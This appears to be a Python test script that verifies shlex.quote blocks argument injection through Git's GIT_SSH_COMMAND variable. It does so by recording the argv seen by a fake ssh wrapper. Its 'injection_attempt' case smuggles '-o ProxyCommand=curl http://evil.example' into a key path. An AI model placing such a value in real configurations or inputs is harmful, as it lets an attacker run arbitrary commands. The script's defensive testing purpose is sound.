#!/usr/bin/env python3
"""Phase 8 R-12 / B6: prove `shlex.quote` defeats `GIT_SSH_COMMAND` shell-split injection.

Test matrix for the `GIT_SSH_COMMAND` env var value:

  * plain absolute path (baseline)
  * path with a single space
  * path with a single quote (`don't`)
  * path with a double quote
  * path with UTF-8 (Cyrillic)
  * injected `-o ProxyCommand=...` payload — reproducing the canonical
    attack demonstration: without `shlex.quote` it escapes; with it,
    ssh receives a single argv element that starts with `-i ` and it
    refuses.

For each case, we synthesize two env values (unquoted vs quoted via
`shlex.quote`) and run `git ls-remote file:///tmp/bogus-repo.git` (a
local file URL — but crucially, git still honours `GIT_SSH_COMMAND`
when parsing the env value because the variable is parsed at env-load
time regardless of the actual transport in use; on the `ssh` transport
we would see a real ssh error, on `file://` we only see git's remote
error, which is fine for *this* spike because we only want to capture
the argv as seen by `ssh` — we override PATH to point at a spying
wrapper).

The spying wrapper lives in an anonymous temp-dir on PATH and is named
`ssh`. It writes its argv to a JSON file and exits non-zero. That way
we observe exactly what git split out of GIT_SSH_COMMAND.
"""

from __future__ import annotations

import json
import os
import shlex
import stat
import subprocess
import sys
import tempfile
from pathlib import Path


SPY_SCRIPT = """#!/usr/bin/env bash
printf '%s\\n' "$@" > "$SPY_OUT"
exit 99
"""


def write_spy(tmpdir: Path) -> Path:
    spy = tmpdir / "ssh"
    spy.write_text(SPY_SCRIPT)
    spy.chmod(spy.stat().st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    return spy


def run_ls_remote(
    repo: Path, git_ssh_command: str, spy_out: Path, extra_path: Path
) -> dict[str, object]:
    env = {
        **os.environ,
        "GIT_SSH_COMMAND": git_ssh_command,
        "GIT_TERMINAL_PROMPT": "0",
        "SPY_OUT": str(spy_out),
        "PATH": f"{extra_path}:{os.environ['PATH']}",
    }
    proc = subprocess.run(
        [
            "git",
            "-C",
            str(repo),
            "ls-remote",
            "git@github.com:fake/fake.git",  # forces ssh transport
        ],
        env=env,
        capture_output=True,
        text=True,
        timeout=15,
    )
    return {
        "git_ssh_command": git_ssh_command,
        "rc": proc.returncode,
        "stderr": proc.stderr,
        "stdout": proc.stdout,
        "spy_argv": spy_out.read_text().splitlines() if spy_out.exists() else None,
    }


def make_payload(key_path: str) -> str:
    return f"ssh -i {key_path} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new"


def make_quoted_payload(key_path: str) -> str:
    return (
        "ssh -i "
        + shlex.quote(key_path)
        + " -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new"
    )


CASES = [
    ("plain_abs", "/home/user/.ssh/id_vault"),
    ("with_space", "/home/user/my keys/id_vault"),
    ("with_apostrophe", "/home/user/don't/id_vault"),
    ("with_doublequote", '/home/user/foo"bar/id_vault'),
    ("with_cyrillic", "/home/user/ключ/id_vault"),
    (
        "injection_attempt",
        "/tmp/id_vault -o ProxyCommand=curl http://evil.example",
    ),
]


def main() -> int:
    report: dict[str, object] = {"cases": {}}
    with tempfile.TemporaryDirectory(prefix="spike_ssh_command_") as td:
        base = Path(td)
        # bare git repo so git can be happy about -C.
        repo = base / "repo"
        repo.mkdir()
        subprocess.run(["git", "init", "-q", str(repo)], check=True, timeout=10)
        spy_dir = base / "bin"
        spy_dir.mkdir()
        write_spy(spy_dir)
        # Also stub `git-remote-ssh` — not needed; git uses the `ssh` arg0 from env.

        for name, key_path in CASES:
            spy_out_unquoted = base / f"{name}.unquoted.txt"
            spy_out_quoted = base / f"{name}.quoted.txt"
            unq_payload = make_payload(key_path)
            q_payload = make_quoted_payload(key_path)

            report["cases"][name] = {
                "key_path": key_path,
                "unquoted": run_ls_remote(repo, unq_payload, spy_out_unquoted, spy_dir),
                "quoted": run_ls_remote(repo, q_payload, spy_out_quoted, spy_dir),
            }

    # Derived verdict.
    report["verdict"] = {}
    for name in report["cases"]:
        c = report["cases"][name]
        unq_argv = c["unquoted"].get("spy_argv")
        q_argv = c["quoted"].get("spy_argv")
        # unquoted payload on the "injection_attempt" case should split
        # the `-o ProxyCommand=...` into separate args; quoted should not.
        if name == "injection_attempt":
            report["verdict"][name] = {
                "unquoted_split_into_separate_args": (
                    unq_argv is not None and any("ProxyCommand=" in a for a in unq_argv)
                ),
                "quoted_keeps_payload_as_single_i_argument": (
                    q_argv is not None
                    and any(
                        a.startswith("-i") is False and "ProxyCommand=" in a
                        for a in q_argv
                    )
                    is False
                ),
                "quoted_argv": q_argv,
                "unquoted_argv": unq_argv,
            }
        else:
            report["verdict"][name] = {
                "unquoted_argv": unq_argv,
                "quoted_argv": q_argv,
                "quoted_preserves_path_as_single_arg": (
                    q_argv is not None
                    and sum(1 for a in q_argv if a == key_path) == 1
                ),
            }

    out_path = Path(__file__).with_name("spike_git_ssh_command_report.json")
    out_path.write_text(json.dumps(report, indent=2, default=str), encoding="utf-8")
    print(f"wrote {out_path}")
    for name, v in report["verdict"].items():
        print(f"--- {name} ---")
        print(json.dumps(v, indent=2, default=str)[:500])
    return 0


if __name__ == "__main__":
    sys.exit(main())
